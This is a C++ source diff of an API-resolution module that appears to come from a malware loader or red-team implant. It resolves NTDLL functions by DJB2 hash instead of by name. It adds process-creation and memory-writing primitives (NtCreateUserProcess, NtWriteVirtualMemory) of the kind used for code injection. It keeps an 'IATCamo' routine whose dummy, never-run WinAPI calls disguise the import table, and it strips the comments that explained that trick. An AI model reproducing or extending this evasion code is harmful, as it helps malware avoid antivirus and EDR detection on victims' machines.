@@ -46,30 +46,6 @@ constexpr DWORD API::HashStringDjb2A(const char* string) {
     return hash;
 }
 
-
-namespace hashes
-{
-    /* NTDLL */
-    constexpr DWORD NtQueryInformationProcess  = integral_constant<DWORD, HashStringDjb2A("NtQueryInformationProcess")>::value;
-    constexpr DWORD NtCreateProcess            = integral_constant<DWORD, HashStringDjb2A("NtCreateProcess")>::value;
-    constexpr DWORD NtTerminateProcess         = integral_constant<DWORD, HashStringDjb2A("NtTerminateProcess")>::value;
-    constexpr DWORD NtCreateThread             = integral_constant<DWORD, HashStringDjb2A("NtCreateThread")>::value;
-    constexpr DWORD LdrLoadDll                 = integral_constant<DWORD, HashStringDjb2A("LdrLoadDll")>::value;
-    constexpr DWORD NtOpenProcess              = integral_constant<DWORD, HashStringDjb2A("NtOpenProcess")>::value;
-    constexpr DWORD NtCreateFile               = integral_constant<DWORD, HashStringDjb2A("NtCreateFile")>::value;
-    constexpr DWORD RtlInitUnicodeString       = integral_constant<DWORD, HashStringDjb2A("RtlInitUnicodeString")>::value;
-    constexpr DWORD NtAllocateVirtualMemory    = integral_constant<DWORD, HashStringDjb2A("NtAllocateVirtualMemory")>::value;
-    constexpr DWORD NtProtectVirtualMemory     = integral_constant<DWORD, HashStringDjb2A("NtProtectVirtualMemory")>::value;
-    constexpr DWORD NtFlushInstructionCache    = integral_constant<DWORD, HashStringDjb2A("NtFlushInstructionCache")>::value;
-    constexpr DWORD LdrGetProcedureAddress     = integral_constant<DWORD, HashStringDjb2A("LdrGetProcedureAddress")>::value;
-
-    /* KERNEL32 */
-    constexpr DWORD SetFileInformationByHandle = integral_constant<DWORD, HashStringDjb2A("SetFileInformationByHandle")>::value;
-    constexpr DWORD GetCurrentProcess          = integral_constant<DWORD, HashStringDjb2A("GetCurrentProcess")>::value;
-
-
-};
-
 APIResolver::~APIResolver()
 {
     FreeModules();
@@ -85,7 +61,8 @@ const API_ACCESS& APIResolver::GetAPIAccess() const
 void APIResolver::ResolveFunctions()
 {
     api.func.pNtQueryInformationProcess  = reinterpret_cast<NtQueryInformationProcess_t> (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtQueryInformationProcess));
-    api.func.pNtCreateProcess            = reinterpret_cast<NtCreateProcess_t>           (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateProcess));
+    api.func.pNtCreateProcess            = reinterpret_cast<NtCreateProcess_t>           (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateProcess)); // Use NtCreateUserProcess instead
+    api.func.pNtCreateUserProcess        = reinterpret_cast<NtCreateUserProcess_t>       (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateUserProcess));
     api.func.pNtCreateThread             = reinterpret_cast<NtCreateThread_t>            (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtCreateThread));
     api.func.pLdrLoadDll                 = reinterpret_cast<LdrLoadDll_t>                (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::LdrLoadDll));
     api.func.pNtOpenProcess              = reinterpret_cast<NtOpenProcess_t>             (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtOpenProcess));
@@ -93,15 +70,16 @@ void APIResolver::ResolveFunctions()
     api.func.RtlInitUnicodeString        = reinterpret_cast<RtlInitUnicodeString_t>      (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::RtlInitUnicodeString));
     api.func.pNtAllocateVirtualMemory    = reinterpret_cast<NtAllocateVirtualMemory_t>   (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtAllocateVirtualMemory));
     api.func.pNtProtectVirtualMemory     = reinterpret_cast<NtProtectVirtualMemory_t>    (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtProtectVirtualMemory));
+    api.func.pNtWriteVirtualMemory       = reinterpret_cast<NtWriteVirtualMemory_t>      (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtWriteVirtualMemory));
     api.func.pNtFlushInstructionCache    = reinterpret_cast<NtFlushInstructionCache_t>   (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::NtFlushInstructionCache));
     api.func.pLdrGetProcedureAddress     = reinterpret_cast<LdrGetProcedureAddress_t>    (GetProcessAddressByHash(this->api.mod.Ntdll, hashes::LdrGetProcedureAddress));
 
     api.func.pSetFileInformationByHandle = reinterpret_cast<pSetFileInformationByHandle_t>(GetProcessAddressByHash(this->api.mod.Kernel32, hashes::SetFileInformationByHandle));
 }
 
-PVOID API::APIResolver::_(PVOID* ppAddress)
+void *API::APIResolver::_(void** ppAddress)
 {
-    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
+    void *pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
     if (!pAddress)
         return NULL;
 
@@ -128,13 +106,10 @@ void APIResolver::LoadModules()
 
 void API::APIResolver::IATCamo()
 {
-    PVOID		pAddress = NULL;
+    void		*pAddress = NULL;
     int* dummy = (int*)_(&pAddress);
 
-    // This if statement will never run
     if (*dummy > 350) {
-
-        // Whitelisted Winapis
         unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
         i = GetLastError();
         i = SetCriticalSectionSpinCount(NULL, NULL);
